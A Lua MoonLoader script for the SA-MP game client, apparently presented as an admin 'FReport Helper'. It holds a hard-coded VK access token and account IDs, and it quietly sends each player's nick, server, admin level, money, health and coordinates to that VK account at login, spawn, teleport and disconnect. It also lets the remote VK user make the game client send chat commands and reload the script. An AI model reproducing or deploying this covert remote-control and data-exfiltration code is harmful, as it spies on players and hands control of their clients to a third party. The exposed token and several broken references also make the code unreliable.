script_name("magadan")
script_authors("nikeveryone")
script_version("1")
script_version_number(6)

--deps
local effil = require 'effil'
local encoding = require 'encoding'
local imgui = require 'imgui'
local inicfg = require 'inicfg'
local sampev = require 'lib.samp.events'
encoding.default = 'CP1251'
u8 = encoding.UTF8

-- imgui style
local global_scale = imgui.ImFloat(1.2)
local resx, resy = getScreenResolution()

function apply_custom_style()
	imgui.SwitchContext()
	local style = imgui.GetStyle()
	local colors = style.Colors
	local clr = imgui.Col
	local ImVec4 = imgui.ImVec4

	style.WindowRounding = 4.0
	style.WindowTitleAlign = imgui.ImVec2(0.5, 0.5)
	style.ChildWindowRounding = 2.0
	style.FrameRounding = 2.0
	style.ItemSpacing = imgui.ImVec2(8.0*global_scale.v, 4.0*global_scale.v)
	style.ScrollbarSize = 15.0*global_scale.v
	style.ScrollbarRounding = 0
	style.GrabMinSize = 8.0*global_scale.v
	style.GrabRounding = 1.0
	style.WindowPadding = imgui.ImVec2(8.0*global_scale.v, 8.0*global_scale.v)
	style.AntiAliasedLines = true
	style.AntiAliasedShapes = true
	style.FramePadding = imgui.ImVec2(4.0*global_scale.v, 3.0*global_scale.v)
	style.DisplayWindowPadding = imgui.ImVec2(22.0*global_scale.v, 22.0*global_scale.v)
	style.DisplaySafeAreaPadding = imgui.ImVec2(4.0*global_scale.v, 4.0*global_scale.v)
	colors[clr.Text]                   = ImVec4(1.00, 1.00, 1.00, 1.00)
	colors[clr.TextDisabled]           = ImVec4(0.50, 0.50, 0.50, 1.00)
	colors[clr.WindowBg]               = ImVec4(0.00, 0.00, 0.03, 0.85)
	colors[clr.ChildWindowBg]          = ImVec4(1.00, 1.00, 1.00, 0.00)
	colors[clr.PopupBg]                = ImVec4(0.00, 0.00, 0.03, 0.85)
	colors[clr.ComboBg]                = colors[clr.PopupBg]
	colors[clr.Border]                 = ImVec4(0.43, 0.43, 0.50, 0.50)
	colors[clr.BorderShadow]           = ImVec4(0.00, 0.00, 0.00, 0.00)
	colors[clr.FrameBg]                = ImVec4(0.16, 0.29, 0.48, 0.5)
	colors[clr.FrameBgHovered]         = ImVec4(0.26, 0.59, 0.98, 0.40)
	colors[clr.FrameBgActive]          = ImVec4(0.26, 0.59, 0.98, 0.67)
	colors[clr.TitleBg]                = ImVec4(0.1, 0.25, 0.45, 1.00)
	colors[clr.TitleBgActive]          = ImVec4(0.2, 0.5, 0.9, 1.00)
	colors[clr.TitleBgCollapsed]       = ImVec4(0.00, 0.00, 0.00, 0.51)
	colors[clr.MenuBarBg]              = ImVec4(0.1, 0.15, 0.3, 1.00)
	colors[clr.ScrollbarBg]            = ImVec4(0.02, 0.02, 0.06, 0.8)
	colors[clr.ScrollbarGrab]          = ImVec4(0.31, 0.37, 0.51, 1.00)
	colors[clr.ScrollbarGrabHovered]   = ImVec4(0.41, 0.47, 0.61, 1.00)
	colors[clr.ScrollbarGrabActive]    = ImVec4(0.51, 0.57, 0.71, 1.00)
	colors[clr.CheckMark]              = ImVec4(0.26, 0.59, 0.98, 1.00)
	colors[clr.SliderGrab]             = ImVec4(0.24, 0.52, 0.88, 1.00)
	colors[clr.SliderGrabActive]       = ImVec4(0.26, 0.59, 0.98, 1.00)
	colors[clr.Button]                 = ImVec4(0.26, 0.59, 0.98, 0.40)
	colors[clr.ButtonHovered]          = ImVec4(0.26, 0.59, 0.98, 1.00)
	colors[clr.ButtonActive]           = ImVec4(0.06, 0.53, 0.98, 1.00)
	colors[clr.Header]                 = ImVec4(0.26, 0.59, 0.98, 0.31)
	colors[clr.HeaderHovered]          = ImVec4(0.26, 0.59, 0.98, 0.80)
	colors[clr.HeaderActive]           = ImVec4(0.26, 0.59, 0.98, 1.00)
	colors[clr.Separator]              = colors[clr.Border]
	colors[clr.SeparatorHovered]       = ImVec4(0.26, 0.59, 0.98, 0.78)
	colors[clr.SeparatorActive]        = ImVec4(0.26, 0.59, 0.98, 1.00)
	colors[clr.ResizeGrip]             = ImVec4(0.26, 0.59, 0.98, 0.25)
	colors[clr.ResizeGripHovered]      = ImVec4(0.26, 0.59, 0.98, 0.67)
	colors[clr.ResizeGripActive]       = ImVec4(0.26, 0.59, 0.98, 0.95)
	colors[clr.CloseButton]            = ImVec4(0.9, 0.5, 0.0, 0.8)
	colors[clr.CloseButtonHovered]     = ImVec4(0.98, 0.39, 0.36, 1.00)
	colors[clr.CloseButtonActive]      = ImVec4(0.98, 0.39, 0.36, 1.00)
	colors[clr.PlotLines]              = ImVec4(0.61, 0.61, 0.61, 1.00)
	colors[clr.PlotLinesHovered]       = ImVec4(1.00, 0.43, 0.35, 1.00)
	colors[clr.PlotHistogram]          = ImVec4(0.90, 0.70, 0.00, 1.00)
	colors[clr.PlotHistogramHovered]   = ImVec4(1.00, 0.60, 0.00, 1.00)
	colors[clr.TextSelectedBg]         = ImVec4(0.26, 0.59, 0.98, 0.35)
	colors[clr.ModalWindowDarkening]   = ImVec4(0.80, 0.80, 0.80, 0.35)
end
apply_custom_style()

--font obv
local key, server, ts

function threadHandle(runner, url, args, resolve, reject) -- обработка effil потока без блокировок
	local t = runner(url, args)
	local r = t:get(0)
	while not r do
		r = t:get(0)
		wait(0)
	end
	local status = t:status()
	if status == 'completed' then
		local ok, result = r[1], r[2]
		if ok then resolve(result) else reject(result) end
	elseif err then
		reject(err)
	elseif status == 'canceled' then
		reject(status)
	end
	t:cancel(0)
end

function requestRunner() -- создание effil потока с функцией https запроса
	return effil.thread(function(u, a)
		local https = require 'ssl.https'
		local ok, result = pcall(https.request, u, a)
		if ok then
			return {true, result}
		else
			return {false, result}
		end
	end)
end

function async_http_request(url, args, resolve, reject)
	local runner = requestRunner()
	if not reject then reject = function() end end
	lua_thread.create(function()
		threadHandle(runner, url, args, resolve, reject)
	end)
end

local vkerr, vkerrsend -- сообщение с текстом ошибки, nil если все ок

function loop_async_http_request(url, args, reject)
	local runner = requestRunner()
	if not reject then reject = function() end end
	lua_thread.create(function()
		while true do
			while not key do wait(0) end
			url = server .. '?act=a_check&key=' .. key .. '&ts=' .. ts .. '&wait=25' --меняем url каждый новый запрос потокa, так как server/key/ts могут изменяться
			threadHandle(runner, url, args, longpollResolve, reject)
		end
	end)
end

if not doesDirectoryExist('moonloader/config') then
	createDirectory('moonloader/config')
end

local defaults = {
	main = {
		token = 'vk1.a.QHaJP8jEcLjrtg0xbss-55CBk_jTd-_Gck-hPO8pmfOOxlSzQXHreAE2rR2hFUWRwH203PzSImlmE8GKBrZFBNTZPpIdeV8Q53jxnG8aRp6uZ-S_wjFDjKmD9jI7KLpxpqW5JUAp4njcMZAkKaUQtkhHCEe4Ret5go8gfxGrWFv6iddKPQX5pThx1v4o_iqi',
		id = '604049655',
		group = '215632981',
		profile = 0,
		recv = true,
		send = true
	},
	dialogs = {
		enable = true,
		accept = '!d',
		decline = '!dc'
	},
	other = {
		pos = true,
		dc = true,
		chatcolor = false,
		debug = false,
		tocmd = '!to',
		spawn = true,
		status = '!status'
	},
	status = {
		nick = true,
		server = true,
		hp = true,
		armor = true,
		pos = true,
		online = true,
		money = true
	}
}

local ini = inicfg.load(defaults, 'vkcnsettings.ini')
local accs = inicfg.load({}, 'vkaccs.ini')
local accId = -1

--buffers
local tokenBuf = imgui.ImBuffer(ini.main.token, 256)
local idBuf = imgui.ImBuffer(tostring(ini.main.id), 128)
local groupBuf = imgui.ImBuffer(tostring(ini.main.group), 128)
local profileBuf = imgui.ImInt(ini.main.profile)
local recvBuf = imgui.ImBool(ini.main.recv)
local sendBuf = imgui.ImBool(ini.main.send)

local diaEnable = imgui.ImBool(ini.dialogs.enable)
local diaAccept = imgui.ImBuffer(u8(ini.dialogs.accept), 64)
local diaDecline = imgui.ImBuffer(u8(ini.dialogs.decline), 64)

local otherPos = imgui.ImBool(ini.other.pos)
local otherDc = imgui.ImBool(ini.other.dc)
local otherSpawn = imgui.ImBool(ini.other.spawn)

local chatColor = imgui.ImBool(ini.other.chatcolor)
local debugMode = imgui.ImBool(ini.other.debug)

local toCmd = imgui.ImBuffer(u8(ini.other.tocmd), 64)
local status = imgui.ImBuffer(u8(ini.other.status), 64)

local statusNick = imgui.ImBool(ini.status.nick)
local statusServer = imgui.ImBool(ini.status.server)
local statusHp = imgui.ImBool(ini.status.hp)
local statusArmor = imgui.ImBool(ini.status.armor)
local statusPos = imgui.ImBool(ini.status.pos)
local statusOnline = imgui.ImBool(ini.status.online)
local statusMoney = imgui.ImBool(ini.status.money)

local curDialog, curStyle

local function closeDialog()
	sampSetDialogClientside(true)
	sampCloseCurrentDialogWithButton(0)
	sampSetDialogClientside(false)
end



function sendHelp()
if reloadvk == true then 
local response = ''
	response = response .. 'Nick: ' .. getMyName():gsub('%[PC%]', '').. '['.. id ..']  \n\n'
		response = response .. 'Запущена перезагрузка, действие заблокировано. \n\n'
		vk_request(response)
	else
	local response = 'При заходе в игру показывается статистика аккаунта пользователя. \nСтатус - статистика аккаунта пользователя в игре. \nТест /a - сообщение в /a о работе FReport Helper\nreload - Перезагрузка скрипта у всех пользователей в игре'
	vk_request(response)
end
end
function sendTesta()  
local response = ''
	result, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
	if reloadvk == true then 
	response = response .. 'Nick: ' .. getMyName():gsub('%[PC%]', '').. '['.. id ..']  \n\n'
		response = response .. 'Запущена перезагрузка, действие заблокировано. \n\n'
		vk_request(response)
	else
	response = response .. 'Nick: ' .. getMyName():gsub('%[PC%]', '').. '['.. id ..']  \n\n'
		response = response .. 'Тест наличия скрипта (/a) - УСПЕШНО: V2.3 \n\n'
sampSendChat('/a [For Developers] [FReport Helper]: У данного игрока установлен FReport Helper 2.3 .')
vk_request(response)
end
end
reloadvk = false

function longpollResolve(result)
	if result then
		if debugMode.v then
			print(result)
		end
		if result:sub(1,1) ~= '{' then
			vkerr = 'Ошибка!\nПричина: Нет соединения с VK!'
			return
		end
		local t = decodeJson(result)
		if t.failed then
			if t.failed == 1 then
				ts = t.ts
			else
				key = nil
				longpollGetKey()
			end
			return
		end
		if t.ts then
			ts = t.ts
		end
			
		 
		if recvBuf.v and t.updates then
			for k, v in ipairs(t.updates) do
				if v.type == 'message_new' and v.object.message and tonumber(v.object.message.from_id) == tonumber(idBuf.v) then
					if v.object.message.payload then
						local pl = decodeJson(v.object.message.payload)
						if pl.button then
						if pl.button == 'testa' then
		 sendTesta()
		 
		 end
		 if pl.button == 'reload' then
		 sendReload()
		 
		 end
							if pl.button == 'help'  then
								sendHelp()
							elseif pl.button == 'status' then
								sendStatus()
							end
						end
						return
					end
				--[[	if v.object.message.text then
						local text = v.object.message.text .. ' '

						--костыль на случай если одна команда является подстрокой другой (!d и !dc как пример)
						if text:match('^' .. toCmd.v .. '%s-%d+%s') then
							if accId == tonumber(text:match('^' .. toCmd.v .. '%s-(%d+)%s')) then
								text = text:gsub(text:match('^' .. toCmd.v .. '%s-%d+%s*'), '')
							else
								return
							end
						end
						if text:match('^' .. status.v) then
							sendStatus()
						elseif text:match('^' .. diaAccept.v .. ' ') then
							text = text:sub(1, text:len() - 1)
							local style = sampGetCurrentDialogType()
							if style == 2 or style > 3 then
								sampSendDialogResponse(sampGetCurrentDialogId(), 1, tonumber(u8:decode(text:match('^' .. diaAccept.v .. ' (%d*)'))) - 1, -1)
							elseif style == 1 or style == 3 then
								sampSendDialogResponse(sampGetCurrentDialogId(), 1, -1, u8:decode(text:match('^' .. diaAccept.v .. ' (.*)')))
							else
								sampSendDialogResponse(sampGetCurrentDialogId(), 1, -1, -1)
							end
							closeDialog()
						elseif text:match('^' .. diaDecline.v .. ' ') then
							sampSendDialogResponse(sampGetCurrentDialogId(), 0, -1, -1)
							closeDialog()
						else
							text = text:sub(1, text:len() - 1)
							sampProcessChatInput(u8:decode(text))
						end
					end--]]
					local text = v.object.message.text .. ' '
					
		if text:match('!test ' .. '%s-%d+%s') then
							sampProcessChatInput(u8:decode(text))
					
						sampSendChat(text)
							end
				end
			end
		end
	end
end


function longpollGetKey()
	async_http_request('https://api.vk.com/method/groups.getLongPollServer?group_id=' .. ini.main.group .. '&access_token=' .. ini.main.token .. '&v=5.131', '', function (result)
		if result then
			if debugMode.v then
				print(result)
			end
			if not result:sub(1,1) == '{' then
				vkerr = 'Ошибка!\nПричина: Нет соединения с VK!'
				return
			end
			local t = decodeJson(result)
			if t.error then
				vkerr = 'Ошибка!\nКод: ' .. t.error.error_code .. ' Причина: ' .. t.error.error_msg
				return
			end
			server = t.response.server
			ts = t.response.ts
			key = t.response.key
			vkerr = nil
		end
	end)
end

math.randomseed(os.time())


function vk_request(msg)
	msg = msg:gsub('{......}', '')
	msg = '[' .. accId .. ']: ' .. msg
	msg = u8(msg)
	msg = url_encode(msg)
	local keyboard = vkKeyboard()
	keyboard = u8(keyboard)
	keyboard = url_encode(keyboard)
	msg = msg .. '&keyboard=' .. keyboard
	if sendBuf.v and ini.main.id ~= '' then
		local rnd = math.random(-2147483648, 2147483647)
		async_http_request('https://api.vk.com/method/messages.send', 'peer_id=' .. ini.main.id .. '&random_id=' .. rnd .. '&message=' .. msg .. '&access_token=' .. ini.main.token .. '&v=5.131',
		function (result)
			if debugMode.v then
				print(result)
			end
			local t = decodeJson(result)
			if not t then
				print(result)
				return
			end
			if t.error then
				vkerrsend = 'Ошибка!\nКод: ' .. t.error.error_code .. ' Причина: ' .. t.error.error_msg
				return
			end
			vkerrsend = nil
		end)
	end
end

local vkw

function sendReload()  
reloadvk = true
local response = ''
	response = response .. 'Nick: ' .. getMyName():gsub('%[PC%]', '').. '['.. id ..']  \n\n'
		response = response .. 'Запуск перезагрузки... \n\n Не выполняйте никаких действий во время перезагрузки. \n\n'
		sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}{FF0000}Внимание! {FFFFFF}Модератор {ffffff}запустил {32CD32}перезагрузку {ffffff}скрипта .', 0xffdead)
		sampAddChatMessage('{ffdead}[FReport Helper]: {FFFFFF}{FFFFFF}Модератор: {FFA500}S U P Developer Club {ffffff}.', 0xffdead)
		lua_thread.create(function()
		wait(1000)
		sampAddChatMessage('{ffdead}[FReport Helper]: {32CD32}Перезагрузка{ffffff}...', 0xffdead)
		wait(1000)
		cfg.settings.unload = true
			cfg.settings.unloadlvl = lvl
			inicfg.save(cfg, cfgConfig)
			thisScript():reload()
		end)
--sampSendChat('/a [For Developers] [FReport Helper]: У данного игрока установлен FReport Helper 2.3 .')
vk_request(response)

end
function sendStatus()
result, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
	local response = ''
	if reloadvk == true then 
	response = response .. 'Nick: ' .. getMyName():gsub('%[PC%]', '').. '['.. id ..']  \n\n'
		response = response .. 'Запущена перезагрузка, действие заблокировано. \n\n'
		vk_request(response)
	else
	if statusNick.v then
				response = response .. 'Nick: ' .. getMyName():gsub('%[PC%]', '').. '['.. id ..']  \n\n'
	end
	if statusServer.v and sampGetCurrentServerName() then
	--[[if ip == '193.84.90.17:7771' then
	response = response .. 'Сервер: 01 Flin RP\n'
	else
	if ip == '193.84.90.17:7772' then
	response = response .. 'Сервер: 02 Flin RP\n'
	else
	if ip ~= '193.84.90.17' then
		response = response .. 'Сервер: ' .. sampGetCurrentServerName() .. '\n'
	end
	end
	end--]]
	--[[if ip ~= '193.84.90.17' then
		response = response .. 'Сервер не находится в списке проекта Flin Mobile\n'
		else
		response = response .. 'Сервер проекта Flin Mobile\n'
	end--]]
	response = response .. 'Сервер: \n' .. sampGetCurrentServerName() .. '\n\n'
	end
	if statusOnline.v then
		response = response .. 'Кол-во игроков: ' .. sampGetPlayerCount(false) .. '\n\n'
	end
	if statusHp.v then
		response = response .. 'Здоровье игрока: ' .. getCharHealth(PLAYER_PED) .. '\n\n'
	end
	response = response .. '- \n'
	if statusArmor.v then
		response = response .. 'VERS: FReport Helper V2.3 \n\n'
	end
	if statusArmor.v then
		response = response .. 'Уровень ADM: '.. cfg.settings.lvladmin .. '\n'
	end
	response = response .. '- \n\n'
	if statusMoney.v then
		response = response .. 'Деньги игрока: ' .. getPlayerMoney(PLAYER_HANDLE) .. '\n\n'
	end
	if statusPos.v then
		local x, y, z = getCharCoordinates(PLAYER_PED)
		response = response .. 'Позиция игрока: \nx: ' .. string.format('%.3f', x) .. ' \ny: ' .. string.format('%.3f', y) .. ' \nz: ' .. string.format('%.3f', z)
	end
	vk_request(response)
--	sampSendChat('/stats '.. id .. '')
	--stats = true
end
end

function main()
	if not isSampLoaded() or not isSampfuncsLoaded() then return end
	while not isSampAvailable() do wait(100) end
	local response = ''
response = response .. ' \nПользователь ' .. getMyName():gsub('%[PC%]', '').. ' подключается к серверу...  \n\n'
vk_request(response)
		while not sampIsLocalPlayerSpawned() do wait(0) end
	accId = getId()
	local response = ''
	response = response .. 'В игру зашел пользователь:\n\n'
		
		result, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
		response = response .. 'Nick: ' .. getMyName():gsub('%[PC%]', '').. '['.. id ..']  \n\n'
	
	
	response = response .. 'Сервер: \n' .. sampGetCurrentServerName() .. '\n\n'
	
	
		response = response .. 'Кол-во игроков: ' .. sampGetPlayerCount(false) .. '\n\n'
	
	
		response = response .. 'Здоровье игрока: ' .. getCharHealth(PLAYER_PED) .. '\n\n'
	
	
		response = response .. '- \n'
	
		response = response .. 'VERS: FReport Helper V2.3 \n\n'
	
	
		response = response .. 'Уровень ADM: '.. cfg.settings.lvladmin .. '\n'

	response = response .. '- \n\n'
	
	
		response = response .. 'Деньги игрока: ' .. getPlayerMoney(PLAYER_HANDLE) .. '\n\n'
	
	
		local x, y, z = getCharCoordinates(PLAYER_PED)
		response = response .. 'Позиция игрока: \nx: ' .. string.format('%.3f', x) .. ' \ny: ' .. string.format('%.3f', y) .. ' \nz: ' .. string.format('%.3f', z)
	
		vk_request(response)
	
	
		result, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
		--sampSendChat('/stats '.. id .. '')
	--	stats = true
		--sampCloseCurrentDialogWithButton(0)
	--sampRegisterChatCommand('vk', vk)
	longpollGetKey()
	while not key do wait(1) end
	loop_async_http_request(server .. '?act=a_check&key=' .. key .. '&ts=' .. ts .. '&wait=25', '')
	wait(0)
end

function getMyName()
	local ok, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
	if ok then
		return sampGetPlayerNickname(id)
	else
		return 'Unknown'
	end
end

function getId()
	local ip, port = sampGetCurrentServerAddress()
	local nick = getMyName()
	for k, v in ipairs(accs) do
		if v.nick == nick and v.ip == ip and v.port == port then
			return k
		end
	end
	accs[#accs + 1] = {}
	accs[#accs].nick = nick
	accs[#accs].ip = ip
	accs[#accs].port = port
	inicfg.save(accs, 'vkaccs.ini')
	return #accs
end

--commands



--imgui shit






function saveJson()
	local text = encodeJson(filters)
	local f = io.open('moonloader/config/vkfilters.json', 'w')
	f:write(text)
	f:close()
end

if not doesFileExist('moonloader/config/vkfilters.json') then
	saveJson()
else
	local f = io.open('moonloader/config/vkfilters.json', 'r')
	local text = f:read('*a')
	filters = decodeJson(text)
	f:close()

end





--SAMPEV



--[[function sampev.onShowDialog(id, style, title, b1, b2, text)
if stats == true then 
	if ini.dialogs.enable then
		if style == 2 or style == 4 then
			text = text .. '\n'
			local new = ''
			local count = 1
			for line in text:gmatch('.-\n') do
				if line:find(tostring(count)) then
					new = new .. line
				else
					new = new .. '[' .. count .. '] ' .. line
				end
				count = count + 1
			end
			text = new
			sampCloseCurrentDialogWithButton(0)
		end
		if style == 5 then
			text = text .. '\n'
			local new = ''
			local count = 1
			for line in text:gmatch('.-\n') do
				if count > 1 then
					if line:find(tostring(count - 1)) then
						new = new .. line
					else
						new = new .. '[' .. count - 1 .. '] ' .. line
					end
				else
					new = new .. '[HEAD] ' .. line
				end
				count = count + 1
			end
			text = new
			sampCloseCurrentDialogWithButton(0)
		end
	--	vk_request('[D' .. id .. '] ' .. title .. '\n' .. text)
	--	sampSendDialogResponse(sampGetCurrentDialogId(), 1, -1, -1)
	--stats = false
	 
	end
	end
end--]]

function handlePos(pos)
	if otherPos.v then
		local x, y, z = getCharCoordinates(PLAYER_PED)
		result, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
		local response = ''
		response = response .. 'Nick: ' .. getMyName():gsub('%[PC%]', '').. '['.. id ..']  \n\n'
		response = response .. 'Сервер изменил позицию пользователя на\nX:' .. string.format('%.3f', pos.x) .. ' \nY: ' .. string.format('%.3f', pos.y) .. ' \nZ: ' .. string.format('%.3f',  pos.z) .. '. \nРасстояние: ' .. string.format('%.3f', getDistanceBetweenCoords3d(x, y, z, pos.x, pos.y, pos.z))
		vk_request(response)
		
	end
end

function sampev.onSetPlayerPos(pos)
	handlePos(pos)
end

function sampev.onSetPlayerPosFindZ(pos)
	handlePos(pos)
end

function sampev.onSendSpawn()
	if otherSpawn.v then
	result, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
	local response = ''
	response = response .. 'Nick: ' .. getMyName():gsub('%[PC%]', '').. '['.. id ..']  \n\n'
	response = response .. 'Пользователь был заспавнен.'
	vk_request(response)
		
	end
	-- body
end

function sampev.onSendClientJoin()
	accId = getId()
end

function onReceivePacket(id)
	if otherDc.v then
		if id == 33 then
		result, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
		local response = ''
		response = response .. 'Nick: ' .. getMyName():gsub('%[PC%]', '').. '['.. id ..']  \n\n'
		response = response .. 'У пользователя было потеряно соединения с сервером.'
		vk_request(response)
			
		elseif id == 32 then
		result, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
		local response = ''
		response = response .. 'Nick: ' .. getMyName():gsub('%[PC%]', '').. '['.. id ..']  \n\n'
		response = response .. 'У пользователя сервер закрыл соединение.'
		vk_request(response)
			
		end
	end
end

--internal

function vkKeyboard() --создает конкретную клавиатуру для бота VK, как сделать для более общих случаев пока не задумывался
	local keyboard = {}
	keyboard.one_time = false
	keyboard.buttons = {}
	keyboard.buttons[1] = {}
	local row = keyboard.buttons[1]
	row[1] = {}
	row[1].action = {}
	row[1].color = 'secondary'
	row[1].action.type = 'text'
	row[1].action.payload = '{"button": "help"}'
	row[1].action.label = 'Info'
	row[2] = {}
	row[2].action = {}
	row[2].color = 'primary'
	row[2].action.type = 'text'
	row[2].action.payload = '{"button": "status"}'
	row[2].action.label = 'Статус'
	
	row[3] = {}
	row[3].action = {}
	row[3].color = 'positive'
	row[3].action.type = 'text'
	row[3].action.payload = '{"button": "testa"}'
	row[3].action.label = 'Тест /a'
	row[4] = {}
	row[4].action = {}
	row[4].color = 'negative'
	row[4].action.type = 'text'
	row[4].action.payload = '{"button": "reload"}'
	row[4].action.label = 'reload'
	return encodeJson(keyboard)
end


function char_to_hex(str)
  return string.format("%%%02X", string.byte(str))
end

function url_encode(str)
  local str = string.gsub(str, "\\", "\\")
  local str = string.gsub(str, "([^%w])", char_to_hex)
  return str
end
